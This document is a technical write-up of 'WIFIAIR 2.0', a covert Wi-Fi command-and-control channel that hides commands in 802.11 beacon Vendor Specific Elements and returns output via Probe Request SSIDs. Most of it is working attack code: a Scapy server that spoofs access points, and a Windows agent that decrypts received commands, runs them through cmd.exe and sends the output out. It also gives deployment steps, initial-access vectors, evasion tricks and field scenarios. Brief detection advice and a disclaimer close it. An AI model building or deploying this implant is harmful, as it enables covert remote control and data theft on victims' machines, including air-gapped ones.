# Covert Wi-Fi C2 Using Vendor Specific Elements (VSE)

This write-up documents a high-bandwidth covert command channel that uses **802.11 Vendor Specific Elements (Tag 221)** as a bidirectional C2 transport:

> **Project Context:** This technique is a modular component of the next-generation **Audix C2 Framework**, currently under development and scheduled for release in **Q1 2026**.
> [Learn more about the Audix C2](https://www.security-auditing.com/C2)

- **Server (Python / Kali, monitor mode):**  
  Injects beacon frames with **hidden payloads inside VSE tags**, appearing as a legitimate access point.
- **Agent (Windows / WLAN API):**  
  Scans for nearby Wi-Fi networks, parses raw Information Elements (IEs) from beacons, extracts VSE payloads, reassembles commands, executes them, and **exfiltrates responses via Probe Requests**.

No association to any access point is required. A powered-on machine with a Wi-Fi card is sufficient.

---

## 1. High-Level Concept

**Goal:**  
Use **802.11 beacon frames with Vendor Specific Elements** as an *air-gap-style* bidirectional C2 channel with high downstream bandwidth:

- The Python script on Kali crafts fake beacons that look like legitimate APs (e.g., `xfinitywifi`, `linksys`) but contain hidden command payloads inside **Tag 221 (VSE)**.
- **VSE Stacking**: Multiple Tag 221 elements are packed into a single beacon frame, achieving **~1.2 KB per packet** (vs. ~30 bytes with SSID-only).
- The agent parses raw IE data from `WlanGetNetworkBssList`, extracts and reassembles command fragments, decrypts them, and executes.
- Responses are **exfiltrated upstream** via Probe Request SSIDs back to the server.

This creates a **wireless, bidirectional C2 path** that:

- Does **not** rely on TCP/IP connectivity from victim to attacker.
- Requires only **physical RF proximity** (scalable via antennas).
- Is **invisible to standard Wi-Fi UIs** (VSE tags are not displayed to users).
- Looks like legitimate AP traffic on the air.

---

## 2. Evolution: Version 1.0 vs 2.0

| Feature | **Version 1.0 (SSID)** | **Version 2.0 (VSE)** |
|:---|:---|:---|
| **Transport Vector** | SSID Field (Network Name) | Vendor Specific Elements (Tag 221) |
| **Visibility** | **Visible** as weird network names (e.g., `RX:AGT01:DATA...`) | **Invisible** to standard UI. Mimics legitimate networks |
| **Downstream Speed** | ~30 Bytes/packet (32-byte SSID limit) | ~1.2 KB/packet (5 VSE tags × 255 bytes) |
| **Upstream (Exfil)** | Not implemented | Via Probe Request SSIDs (~21 bytes/packet) |
| **Reliability** | Low (interleaved scanning, ~90% drop rate) | High (blocking exfil mode) |
| **Targeting** | Broadcast only | Multi-Agent support (unicast + broadcast) |
| **Stealth** | None (visible SSIDs) | Jitter, vendor masquerading, stable identity |
| **Encryption** | Base64 only | RC4 + Base64 |

---

## 3. Over-The-Air Protocol & Frame Format

### 3.1 Downstream Protocol (Server → Agent)

Commands are encrypted (RC4), encoded (Base64), fragmented, and wrapped in a custom binary header inside **Tag 221 (VSE)**.

#### VSE Header Structure (10 bytes)

```text
Offset  Size  Field         Description
------  ----  -----         -----------
0       3     OUI           C2 Identifier: 00:40:96
3       1     Agent ID      Target agent (0 = broadcast, 1-255 = specific)
4       2     Job ID        Unique job identifier (big-endian)
6       2     Sequence      Fragment number, 1-based (big-endian)
8       2     Total         Total fragments in job (big-endian)
10      N     Data          Base64-encoded encrypted command fragment
```

#### Beacon Frame Anatomy

```text
[ 802.11 Beacon Frame ]
   │
   ├── [ Fixed Params ] (Timestamp, Interval, Capabilities)
   │
   ├── [ Tag 0: SSID ] = "linksys" (Stable session identity)
   │
   ├── [ Tag 1: Rates ] = Standard supported rates
   │
   ├── [ Tag 3: DS Parameter Set ] = Channel 6
   │
   ├── [ Tag 221: VSE #1 ] ◄─── PAYLOAD CHUNK 1
   │     │
   │     └── [ OUI: 00:40:96 ] [ Agent: 01 ] [ Job: A5F1 ] [ Seq: 1 ] [ Total: 5 ] [ Data... ]
   │
   ├── [ Tag 221: VSE #2 ] ◄─── PAYLOAD CHUNK 2
   │
   ├── [ Tag 221: VSE #3 ] ◄─── PAYLOAD CHUNK 3
   │
   ├── [ Tag 221: VSE #4 ] ◄─── PAYLOAD CHUNK 4
   │
   └── [ Tag 221: VSE #5 ] ◄─── PAYLOAD CHUNK 5
```

**VSE Stacking:** Up to 5 Tag 221 elements are injected per beacon, each carrying up to 239 bytes of payload data, achieving **~1.2 KB downstream per beacon frame**.

### 3.2 Upstream Protocol (Agent → Server)

The agent exfiltrates command output via **Probe Request SSIDs**. Since Windows cannot inject custom VSE tags, data is encoded into the SSID field.

#### Exfil Header Structure (10 bytes)

```text
Offset  Size  Field         Description
------  ----  -----         -----------
0       3     OUI           Exfil Identifier: 00:40:97
3       1     Agent ID      Responding agent's ID
4       2     Job ID        Job being responded to (big-endian)
6       2     Sequence      Fragment number, 1-based (big-endian)
8       2     Total         Total fragments in response (big-endian)
10      21    Data          Base64-encoded encrypted output fragment
```

#### Probe Request Anatomy

```text
[ 802.11 Probe Request ]
   │
   └── [ Tag 0: SSID ] (Max 32 Bytes)
         │
         ├── [ OUI (3 Bytes) ]      : 00:40:97 (Exfil Signature)
         ├── [ Agent ID (1 Byte) ]  : 0x01
         ├── [ Job ID (2 Bytes) ]   : 0xA5F1
         ├── [ Seq (2 Bytes) ]      : 0x0001
         ├── [ Total (2 Bytes) ]    : 0x000A
         └── [ Data (21 Bytes) ]    : Encrypted Output Fragment
```

**Bandwidth Constraint:** SSID is limited to 32 bytes. After 10 bytes of header, only **21 bytes of payload per packet** are available for upstream exfiltration.

### 3.3 Encryption Layer

Both directions use **RC4 stream cipher** with a pre-shared 16-byte key:

```python
# Server (Python)
RC4_KEY = bytes([0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 
                 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01])
```

```cpp
// Agent (C++)
const BYTE RC4_KEY[] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
                         0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
```

**Processing Pipeline:**

- **Downstream:** `Command → RC4 Encrypt → Base64 Encode → Fragment → VSE Tags`
- **Upstream:** `Output → RC4 Encrypt → Base64 Encode → Fragment → Probe SSIDs`

---

## 4. Sender (Kali / Python / Scapy) Walkthrough

### 4.1 Session Identity Generation

At startup, the server generates a **stable session identity** that mimics a real access point:

```python
def generate_session_identity():
    vendor_prefixes = [
        ([0x00, 0x1A, 0x2B], "Cisco"),
        ([0x00, 0x1E, 0x58], "D-Link"),
        ([0x00, 0x24, 0xB2], "Netgear"),
        ([0x00, 0x26, 0x5A], "TP-Link"),
        ([0x00, 0x1C, 0x10], "Linksys"),
    ]
    ssid_options = ["xfinitywifi", "linksys", "NETGEAR", "ATT-WIFI-5G", "HOME-WIFI"]
    
    prefix, vendor = random.choice(vendor_prefixes)
    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
    bssid = ':'.join(f'{b:02x}' for b in prefix + suffix)
    ssid = random.choice(ssid_options)
    
    return bssid, ssid, vendor
```

This creates a consistent AP identity (BSSID + SSID) for the entire session, appearing as a single legitimate access point.

### 4.2 Command Preparation & Fragmentation

```python
def prepare_job(command, agent_id=0):
    # Encrypt command
    data = command.encode('utf-8')
    encrypted = rc4(RC4_KEY, data)
    payload = base64.b64encode(encrypted)
    
    # Fragment into 239-byte chunks (VSE can hold up to 255, minus header)
    chunk_size = 239
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    
    # Generate random job ID
    job_id = struct.pack('>H', random.randint(1, 65535))
    total = len(chunks)
    
    # Build each chunk with header
    prepared = []
    for seq, chunk_data in enumerate(chunks, 1):
        header = C2_OUI + bytes([agent_id]) + job_id + \
                 struct.pack('>H', seq) + struct.pack('>H', total)
        prepared.append(header + chunk_data)
    
    return job_id, prepared, agent_id
```

### 4.3 Beacon Frame Crafting

```python
def create_beacon(chunks_batch):
    # 802.11 Management Frame (Beacon)
    dot11 = Dot11(type=0, subtype=8, 
                  addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                  addr2=SESSION_BSSID,         # Our stable BSSID
                  addr3=SESSION_BSSID)
    
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=SESSION_SSID, len=len(SESSION_SSID))
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    dsset = Dot11Elt(ID='DSset', info=b'\x06')  # Channel 6
    
    packet = RadioTap()/dot11/beacon/essid/rates/dsset
    
    # Stack multiple VSE tags (up to 5 per beacon)
    for chunk in chunks_batch:
        packet = packet / Dot11Elt(ID=221, info=chunk)
    
    return packet
```

### 4.4 Jittered Broadcast Loop

```python
BEACON_JITTER_MIN = 0.08   # 80ms
BEACON_JITTER_MAX = 0.12   # 120ms (typical for real APs ~100ms)

def broadcast_loop():
    while broadcast_active and current_job:
        job_id, chunks, agent_id = current_job
        
        # Send chunks in batches of 5 (VSE stacking)
        for i in range(0, len(chunks), TAGS_PER_BEACON):
            batch = chunks[i:i+TAGS_PER_BEACON]
            sendp(create_beacon(batch), iface=INTERFACE, verbose=0)
            
            # Jittered delay mimics real AP beacon intervals
            time.sleep(random.uniform(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
        
        # Cycle jitter between full broadcasts
        time.sleep(random.uniform(CYCLE_JITTER_MIN, CYCLE_JITTER_MAX))
```

### 4.5 Response Sniffing

The server captures Probe Request frames and extracts exfiltrated data:

```python
def handle_probe(pkt):
    if not pkt.haslayer(Dot11ProbeReq):
        return
    
    ssid = pkt[Dot11Elt].info
    if not ssid or len(ssid) < 10 or ssid[:3] != EXFIL_OUI:
        return  # Not our exfil packet
    
    # Parse header
    agent_id = ssid[3]
    job_id = (ssid[4] << 8) | ssid[5]
    seq = (ssid[6] << 8) | ssid[7]
    total = (ssid[8] << 8) | ssid[9]
    data = ssid[10:]
    
    # Store fragment and reassemble when complete
    # ... (buffering and reassembly logic)
    
    if all_fragments_received:
        full_b64 = ''.join(all_parts)
        encrypted = base64.b64decode(full_b64)
        decrypted = rc4(RC4_KEY, encrypted)
        print(f"[+] Agent {agent_id} Response:\n{decrypted.decode()}")
```

---

## 5. Agent (Windows / WLAN API) Walkthrough

### 5.1 WLAN Enumeration & Raw IE Access

The agent uses Windows WLAN API to scan and access **raw Information Elements**:

```cpp
void ScanLoop() {
    HANDLE hClient = NULL;
    DWORD dwVer = 0;
    WlanOpenHandle(2, NULL, &dwVer, &hClient);
    
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    WlanEnumInterfaces(hClient, NULL, &pIfList);
    GUID* pGuid = &pIfList->InterfaceInfo[0].InterfaceGuid;
    
    while (true) {
        // Trigger scan
        WlanScan(hClient, pGuid, NULL, NULL, NULL);
        WaitForSingleObject(g_hScanComplete, 500);
        
        // Get BSS list with raw IEs
        PWLAN_BSS_LIST pBssList = NULL;
        if (WlanGetNetworkBssList(hClient, pGuid, NULL, 
                                   dot11_BSS_type_any, FALSE, 
                                   NULL, &pBssList) == ERROR_SUCCESS) {
            
            for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
                PWLAN_BSS_ENTRY pEntry = &pBssList->wlanBssEntries[i];
                
                // Parse raw IE data for VSE tags
                if (pEntry->ulIeSize > 0) {
                    ParseVSE(hClient, pGuid, 
                             (PBYTE)pEntry + pEntry->ulIeOffset, 
                             pEntry->ulIeSize);
                }
            }
            WlanFreeMemory(pBssList);
        }
    }
}
```

### 5.2 VSE Parsing & Command Extraction

```cpp
void ParseVSE(HANDLE hClient, GUID* pGuid, PBYTE pRawData, DWORD dwSize) {
    DWORD offset = 0;
    
    while (offset < dwSize) {
        BYTE ieID = pRawData[offset];
        BYTE ieLen = pRawData[offset + 1];
        PBYTE ieData = &pRawData[offset + 2];
        
        // Check for our VSE tag (ID 221, OUI 00:40:96)
        if (ieID == 221 && ieLen >= 10 && memcmp(ieData, C2_OUI, 3) == 0) {
            
            // Extract header fields
            BYTE targetAgent = ieData[3];
            unsigned short jobId = (ieData[4] << 8) | ieData[5];
            unsigned short seq = (ieData[6] << 8) | ieData[7];
            unsigned short total = (ieData[8] << 8) | ieData[9];
            
            // Check targeting (0 = broadcast, else must match our ID)
            if (targetAgent != 0 && targetAgent != g_AgentId) {
                offset += (2 + ieLen);
                continue;  // Not for us
            }
            
            // Skip if job already completed
            if (completed_jobs.count(jobId)) {
                offset += (2 + ieLen);
                continue;
            }
            
            // Extract data chunk
            std::string chunk((char*)(ieData + 10), ieLen - 10);
            
            // Store in job buffer
            JobBuffer& buf = active_jobs[jobId];
            buf.total_chunks = total;
            buf.parts[seq] = chunk;
            
            // Check if job is complete
            if (buf.parts.size() == total) {
                // Reassemble all fragments
                std::string full_b64;
                for (unsigned short i = 1; i <= total; i++)
                    full_b64 += buf.parts[i];
                
                // Decrypt and execute
                std::vector<BYTE> encrypted = Base64Decode(full_b64);
                RC4(RC4_KEY, RC4_KEY_LEN, encrypted.data(), encrypted.size());
                std::string cmd(encrypted.begin(), encrypted.end());
                
                std::cout << "[+] EXECUTE: " << cmd << std::endl;
                std::string output = ExecCommand(cmd);
                
                // Mark for exfiltration
                if (g_ExfilEnabled) {
                    g_CurrentJobId = jobId;
                    g_CurrentOutput = output;
                    g_HasDataToExfil = true;
                }
                
                completed_jobs.insert(jobId);
                active_jobs.erase(jobId);
            }
        }
        offset += (2 + ieLen);
    }
}
```

### 5.3 Response Exfiltration via Probe Requests

```cpp
void SendExfilSequence(HANDLE hClient, GUID* pGuid) {
    // Encrypt output
    std::vector<BYTE> toEncrypt(g_CurrentOutput.begin(), g_CurrentOutput.end());
    RC4(RC4_KEY, RC4_KEY_LEN, toEncrypt.data(), toEncrypt.size());
    std::string b64 = Base64Encode(toEncrypt);
    
    const size_t CHUNK_SIZE = 21;  // Max payload after 10-byte header
    unsigned short total = (b64.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    
    for (int i = 0; i < total; i++) {
        unsigned short seq = i + 1;
        std::string chunk = b64.substr(i * CHUNK_SIZE, CHUNK_SIZE);
        
        // Build SSID with exfil header
        DOT11_SSID ssid = { 0 };
        ssid.ucSSID[0] = EXFIL_OUI[0];  // 00
        ssid.ucSSID[1] = EXFIL_OUI[1];  // 40
        ssid.ucSSID[2] = EXFIL_OUI[2];  // 97
        ssid.ucSSID[3] = g_AgentId;
        ssid.ucSSID[4] = (g_CurrentJobId >> 8) & 0xFF;
        ssid.ucSSID[5] = g_CurrentJobId & 0xFF;
        ssid.ucSSID[6] = (seq >> 8) & 0xFF;
        ssid.ucSSID[7] = seq & 0xFF;
        ssid.ucSSID[8] = (total >> 8) & 0xFF;
        ssid.ucSSID[9] = total & 0xFF;
        memcpy(&ssid.ucSSID[10], chunk.c_str(), chunk.size());
        ssid.uSSIDLength = 10 + chunk.size();
        
        // Send as Probe Request (WlanScan with specific SSID)
        DWORD result = WlanScan(hClient, pGuid, &ssid, NULL, NULL);
        
        if (result == ERROR_SUCCESS)
            std::cout << "." << std::flush;
        else
            std::cout << "!" << std::flush;  // Driver busy, will retry
        
        // Jittered delay between packets
        Sleep(Jitter(g_ExfilJitterMin, g_ExfilJitterMax));
    }
}
```

### 5.4 Blocking Exfil Mode

When a command is executed, the agent enters **Blocking Mode** to ensure reliable exfiltration:

```cpp
if (g_ExfilEnabled && g_HasDataToExfil) {
    DWORD startTime = GetTickCount();
    
    // Dedicate all resources to exfil for the configured duration
    while (GetTickCount() - startTime < g_ExfilDurationMs) {
        SendExfilSequence(hClient, pGuid);
    }
    
    std::cout << "[*] Exfil Timeout. Returning to Scan Mode." << std::endl;
    g_HasDataToExfil = false;
}
```

This stops scanning temporarily and continuously broadcasts the response until the duration expires, giving the server many opportunities to capture all fragments.

### 5.5 Command Execution (Hidden)

```cpp
std::string ExecCommand(const std::string& cmd) {
    std::string result;
    char buffer[4096];
    std::string fullCmd = "cmd.exe /c " + cmd + " 2>&1";
    
    FILE* pipe = _popen(fullCmd.c_str(), "r");
    if (!pipe) return "ERROR: Failed to execute";
    
    while (fgets(buffer, sizeof(buffer), pipe))
        result += buffer;
    
    _pclose(pipe);
    if (result.empty()) result = "[No output]";
    return result;
}
```

---

## 6. Usage / Workflow

### 6.1 Requirements

**Attacker / Operator:**
- Kali Linux with:
  - Wi-Fi card supporting **monitor mode** and **injection**
  - `scapy`, `iwconfig` installed
- Physical proximity to target (scalable with antennas)

**Target Host:**
- Windows machine with Wi-Fi enabled
- WLAN service active
- Agent binary deployed (via initial compromise, USB, physical access)

### 6.2 Server Setup (Kali)

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Lock to channel 6 (required for stable identity)
sudo iwconfig wlan0mon channel 6

# Start server with response listener
sudo python3 server.py -listen -i wlan0mon
```

### 6.3 Agent Deployment (Windows)

**Compilation (MinGW):**

```bash
g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -static
```

**Compilation (Visual Studio):**

Open solution, build as Release x64.

**Deployment:**

```powershell
# Basic (no exfil)
agent.exe -agent 1

# With exfiltration
agent.exe -agent 1 -exfil -duration 60

# With custom jitter (slower, stealthier)
agent.exe -agent 1 -exfil -duration 60 -jitter 3000 5000
```

### 6.4 Sending Commands

**Unicast (to specific agent):**

```text
C2> send 1 whoami
[+] Sending Job 0x8a1f to Agent 1 (1 chunks)
```

**Broadcast (to all agents):**

```text
C2> send 0 hostname
[+] Broadcasting Job 0x3cf2 to ALL agents (1 chunks)
```

### 6.5 Receiving Responses

```text
[<] Agent 1 responding (Job 0x8a1f, 2 chunks)...
============================================================
[+] Agent 1 | Job 0x8a1f | 3.2s
============================================================
desktop-vixx\user
============================================================
```

### 6.6 Exfil Status Symbols

| Symbol | Meaning |
|:------:|:--------|
| `.` | Success - Probe request transmitted |
| `!` | Driver busy - Will retry |
| `X` | Failed - All retries exhausted |

**Troubleshooting:** Many `!` or `X` symbols indicate jitter is too low. Increase with `-jitter 3000 5000`.

---

## 7. Bandwidth & Limitations

### 7.1 Bandwidth Comparison

| Direction | Method | Bandwidth | Capacity |
|:---|:---|:---|:---|
| **Downstream** | VSE Stacking (5 tags) | ~10 KB/s | Shellcode, scripts, binaries |
| **Upstream** | Probe Request SSIDs | ~50 Bytes/s | Short text only |

### 7.2 Range Asymmetry

| Direction | Range | Reason |
|:---|:---|:---|
| **Downstream** | High (1+ km with directional antenna) | Attacker controls Tx power |
| **Upstream** | Low (~50-100m) | Victim laptop has weak internal antenna |

**Implication:** You can send commands from far away, but must be closer to receive responses.

### 7.3 Operational Advice

- **Keep responses short:** Use `findstr`, `head`, `| select` to filter output
- **Process on target:** Send scripts that analyze data locally, return only results
- **Avoid large exfil:** A 10MB file would take hours and generate thousands of packets

---

## 8. Abuse Potential & Threat Model

### 8.1 Initial Access Vectors

The agent must first be deployed:

- **Phishing / Malware:** Dropper installs agent with persistence
- **USB / BadUSB:** HID attack downloads and executes agent
- **Physical Access:** Plant agent on unlocked workstation

Once resident, **all subsequent C2 is RF-only**.

### 8.2 RF / Physical Proximity

Key advantages:
- No corporate VPN or internet required
- No firewall logs (operates below IP layer)
- Works on "air-gapped" systems with Wi-Fi enabled
- Scalable range with antenna equipment

### 8.3 Operational Scenarios

- **Parking lot operations:** Directional antenna from vehicle
- **Adjacent building:** Yagi antenna through windows
- **Embedded implant:** Leave a Pineapple-style device inside building
- **Walk-by activation:** Trigger agent while passing through facility

---

## 9. Detection & Mitigation

### 9.1 Network/RF Detection

- **Anomalous VSE size:** Legitimate VSE tags are small (vendor identifiers). 1KB+ VSE is suspicious.
- **BSSID/SSID mismatch:** A "linksys" SSID with non-Linksys OUI prefix
- **Probe Request patterns:** High-entropy SSIDs matching `00:40:97` prefix
- **Beacon timing:** Jittered beacons may have different timing signatures than real APs

### 9.2 Host-Based Detection

- **WLAN API abuse:** Processes calling `WlanGetNetworkBssList` frequently without user interaction
- **IE parsing:** Non-system processes accessing raw IE data
- **Probe injection:** Applications triggering `WlanScan` with custom SSIDs

### 9.3 Mitigation

- **Disable Wi-Fi** on air-gapped systems
- **Application whitelisting:** Block unknown binaries
- **Wireless IDS:** Monitor for anomalous beacon/probe activity
- **Physical security:** RF sweeps of sensitive areas

### 9.4 MITRE ATT&CK Mapping

- **T1071.001** - Application Layer Protocol (adapted to 802.11)
- **T1095** - Non-Application Layer Protocol
- **T1020** - Automated Exfiltration
- **T1029** - Scheduled Transfer (blocking exfil mode)

---

## 10. Summary

WIFIAIR 2.0 demonstrates:

- **High-bandwidth downstream** via VSE stacking (~1.2 KB/packet)
- **Bidirectional communication** with Probe Request exfiltration
- **Stealth operation** via vendor masquerading and jitter
- **Multi-agent targeting** with unicast and broadcast support
- **Air-gap bridging** using only RF proximity

The technique is relevant for:

- **Red teams** conducting close-access operations
- **Defenders** building RF-aware threat models
- **Researchers** studying covert channel capacity in 802.11

---

## 11. Disclaimer

**Educational Purpose Only.**

This software is a Proof of Concept (PoC) designed to demonstrate the risks of air-gapped networks and 802.11 management frame manipulation. Do not use this tool on networks or systems you do not own or have explicit written permission to test.
